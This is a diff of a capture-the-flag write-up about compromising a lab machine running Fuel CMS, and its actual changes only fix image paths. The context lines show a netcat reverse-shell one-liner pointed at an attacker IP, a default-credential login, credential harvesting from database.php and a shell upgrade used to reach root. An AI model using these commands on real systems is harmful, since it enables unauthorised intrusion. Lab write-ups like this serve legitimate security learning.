@@ -19,7 +19,7 @@ I began by scanning the target machine with `nmap` to identify open ports and ru
 nmap -Pn -sV 10.10.116.74 -oA ignite
 ~~~
 
-![Nmap Scan](assets/img/posts/ctf/ignite/nmap.png)
+![Nmap Scan](../assets/img/posts/ctf/ignite/nmap.png)
 
 The scan revealed that port **80** was open and running an **HTTP service**.
 
@@ -27,7 +27,7 @@ The scan revealed that port **80** was open and running an **HTTP service**.
 
 I opened a browser and navigated to the target’s IP address: http://10.10.116.74
 
-![Home page](assets/img/posts/ctf/ignite/website.png)
+![Home page](../assets/img/posts/ctf/ignite/website.png)
 
 The homepage was simple and didn’t reveal much information directly.
 
@@ -40,7 +40,7 @@ I checked the `robots.txt` file for any hidden directories at http://10.10.116.7
 Disallow: /fuel/
 ~~~
 
-![open reverse shell](assets/img/posts/ctf/ignite/robotstxt.png)
+![open reverse shell](../assets/img/posts/ctf/ignite/robotstxt.png)
 
 This hinted at a potential fuel-powered CMS backend admin interface.
 
@@ -50,7 +50,7 @@ This hinted at a potential fuel-powered CMS backend admin interface.
 
 Navigating to the hidden path: http://10.10.116.74/fuel led me to a **Fuel CMS login page**.
 
-![CMS interface](assets/img/posts/ctf/ignite/fuel.png)
+![CMS interface](../assets/img/posts/ctf/ignite/fuel.png)
 
 
 I attempted several common default credentials.
@@ -63,7 +63,7 @@ I attempted several common default credentials.
 
 The admin-admin combo was valid, which allowed access to the CMS interface.
 
-![CMS interface](assets/img/posts/ctf/ignite/admin.png)
+![CMS interface](../assets/img/posts/ctf/ignite/admin.png)
 
 
 ### 5. Identifying the CMS Version
@@ -80,7 +80,7 @@ I used `searchsploit` to look for vulnerabilities associated with Fuel CMS 1.4.
 searchsploit fuel cms 1.4
 ~~~
 
-![searchsploit](assets/img/posts/ctf/ignite/searchsploit.png)
+![searchsploit](../assets/img/posts/ctf/ignite/searchsploit.png)
 
 Several Remote Code Execution (RCE) scripts were listed. I decided to test a few of them.
 
@@ -188,7 +188,7 @@ The response is parsed and printed, and the loop continues until the user types 
 
 Executing this script allowed me to perform RCE on the target machine.
 
-![open reverse shell](assets/img/posts/ctf/ignite/initialrce.png)
+![open reverse shell](../assets/img/posts/ctf/ignite/initialrce.png)
 <!--Typo (Initialrce with capital I) fixed-->
 
 
@@ -209,11 +209,11 @@ Using the RCE vulnerability, I injected a reverse shell command pointing back to
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.8.182.102 53 >/tmp/f
 ~~~
 
-![open reverse shell](assets/img/posts/ctf/ignite/sendreverse.png)
+![open reverse shell](../assets/img/posts/ctf/ignite/sendreverse.png)
 
 You can now see that the netcat listener open on port 53 was able to catch and access the reverse shell:
 
-![open reverse shell](assets/img/posts/ctf/ignite/listenreverse.png)
+![open reverse shell](../assets/img/posts/ctf/ignite/listenreverse.png)
 
 ### 10. Getting the User flag
 
@@ -222,7 +222,7 @@ Inside the compromised shell, I navigated the file system and located the flag.t
 cat /home/<user>/flag.txt
 ~~~
 
-![user flag](assets/img/posts/ctf/ignite/userflag.png)
+![user flag](../assets/img/posts/ctf/ignite/userflag.png)
 
 ### 11. Finding Credentials for Privillege Escalation
 Looking for sensitive files, I found the following file containing database configuration:
@@ -231,7 +231,7 @@ fuel/application/config/database.php
 ~~~
 Inside it, I found plaintext credentials for the root user.
 
-![open reverse shell](assets/img/posts/ctf/ignite/database.png)
+![open reverse shell](../assets/img/posts/ctf/ignite/database.png)
 
 ### 12. Privilege Escalation to Root
 I attempted to switch to root using the su command:
@@ -243,7 +243,7 @@ but was met with the following error:
 su: must be run from a terminal
 ~~~
 
-![open reverse shell](assets/img/posts/ctf/ignite/escalation.png)
+![open reverse shell](../assets/img/posts/ctf/ignite/escalation.png)
 
 To fix this, I upgraded the shell to a fully interactive TTY by running the following command I found at this *[blog post](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)*.
 ~~~shell
@@ -252,7 +252,7 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 
 Using the password I obtained earlier from database.php, I was able to root the server and gain access to the root flag (root.txt)
 
-![open reverse shell](assets/img/posts/ctf/ignite/rootflag.png)
+![open reverse shell](../assets/img/posts/ctf/ignite/rootflag.png)
 
 ## Summary
 - Enumerated open HTTP port and checked robots.txt
